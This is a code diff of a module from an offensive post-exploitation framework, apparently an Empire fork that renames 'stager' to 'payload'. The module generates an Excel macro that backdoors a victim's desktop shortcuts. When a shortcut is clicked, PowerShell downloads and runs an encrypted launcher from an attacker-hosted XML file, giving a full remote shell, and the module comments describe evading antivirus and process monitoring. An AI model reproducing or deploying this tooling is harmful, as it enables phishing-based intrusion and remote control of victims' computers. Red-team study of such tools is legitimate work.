@@ -4,7 +4,7 @@ from xlwt import Workbook, Utils
 from lib.common import helpers
 from Crypto.Cipher import AES
 
-class Stager:
+class payload:
 
     def __init__(self, mainMenu, params=[]):
 
@@ -13,19 +13,19 @@ class Stager:
 
             'Author': ['@G0ldenGunSec'],
 
-            'Description': ('Generates a macro that backdoors .lnk files on the users desktop, backdoored lnk files in turn attempt to download & execute an invader launcher when the user clicks on them. Usage: Three files will be spawned from this, an xls document (either new or containing existing contents) that data will be placed into, a macro that should be placed in the spawned xls document, and an xml that should be placed on a web server accessible by the remote system (as defined during stager generation).  By default this xml is written to /var/www/html, which is the webroot on debian-based systems such as kali.'),
+            'Description': ('Generates a macro that backdoors .lnk files on the users desktop, backdoored lnk files in turn attempt to download & execute an invader launcher when the user clicks on them. Usage: Three files will be spawned from this, an xls document (either new or containing existing contents) that data will be placed into, a macro that should be placed in the spawned xls document, and an xml that should be placed on a web server accessible by the remote system (as defined during payload generation).  By default this xml is written to /var/www/html, which is the webroot on debian-based systems such as kali.'),
 
-            'Comments': ['Two-stage macro attack vector used for bypassing tools that perform monitor parent processes and flag / block process launches from unexpected programs, such as office. The initial run of the macro is vbscript and spawns no child processes, instead it backdoors targeted shortcuts on the users desktop to do a direct run of powershell next time they are clicked.  The second step occurs when the user clicks on the shortcut, the powershell download stub that runs will attempt to download & execute an invader launcher from an xml file hosted on a pre-defined webserver, which will in turn grant a full shell.  Credits to @harmJ0y and @enigma0x3 for designing the macro stager that this was originally based on, @subTee for research pertaining to the xml.xmldocument cradle, and @curi0usJack for info on using cell embeds to evade AV.']
+            'Comments': ['Two-stage macro attack vector used for bypassing tools that perform monitor parent processes and flag / block process launches from unexpected programs, such as office. The initial run of the macro is vbscript and spawns no child processes, instead it backdoors targeted shortcuts on the users desktop to do a direct run of powershell next time they are clicked.  The second step occurs when the user clicks on the shortcut, the powershell download stub that runs will attempt to download & execute an invader launcher from an xml file hosted on a pre-defined webserver, which will in turn grant a full shell.  Credits to @harmJ0y and @enigma0x3 for designing the macro payload that this was originally based on, @subTee for research pertaining to the xml.xmldocument cradle, and @curi0usJack for info on using cell embeds to evade AV.']
         }
-	#random name our xml will default to in stager options
+	#random name our xml will default to in payload options
 	xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(5,9)))
 
-        # any options needed by the stager, settable during runtime
+        # any options needed by the payload, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
             'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
+                'Description'   :   'Listener to generate payload for.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
@@ -45,7 +45,7 @@ class Stager:
                 'Value'         :   "http://" + helpers.lhost() + "/"+xmlVar+".xml"
             },
             'XlsOutFile' : {
-                'Description'   :   'XLS (incompatible with xlsx/xlsm) file to output stager payload to. If document does not exist / cannot be found a new file will be created',
+                'Description'   :   'XLS (incompatible with xlsx/xlsm) file to output payload payload to. If document does not exist / cannot be found a new file will be created',
                 'Required'      :   True,
                 'Value'         :   '/tmp/default.xls'
             },
@@ -74,8 +74,8 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   'default'
             },
- 	    'StagerRetries' : {
-                'Description'   :   'Times for the stager to retry connecting (2nd stage).',
+ 	    'payloadRetries' : {
+                'Description'   :   'Times for the payload to retry connecting (2nd stage).',
                 'Required'      :   False,
                 'Value'         :   '0'
             },
@@ -117,7 +117,7 @@ class Stager:
 	userAgent = self.options['UserAgent']['Value']
 	proxy = self.options['Proxy']['Value']
 	proxyCreds = self.options['ProxyCreds']['Value']
-	stagerRetries = self.options['StagerRetries']['Value']
+	payloadRetries = self.options['payloadRetries']['Value']
 	targetEXE = self.options['TargetEXEs']['Value']	
 	xlsOut = self.options['XlsOutFile']['Value']
 	XmlPath = self.options['XmlUrl']['Value']
@@ -143,7 +143,7 @@ class Stager:
 	encIV = random.randint(1,240)
 
         # generate the launcher
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language=language, encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, payloadRetries=payloadRetries)
 	launcher = launcher.replace("\"","'")
 	
         if launcher == "":
@@ -231,7 +231,7 @@ class Stager:
 	    print helpers.color("xls written to " + xlsOut + "  please remember to add macro code to xls prior to use\n\n", color="green")
 
 
-	    #encrypt the second stage code that will be dropped into the XML - this is the full invader stager that gets pulled once the user clicks on the backdoored shortcut
+	    #encrypt the second stage code that will be dropped into the XML - this is the full invader payload that gets pulled once the user clicks on the backdoored shortcut
 	    ivBuf = ""
 	    for z in range(0,16):
 		ivBuf = ivBuf + chr(encIV + z)
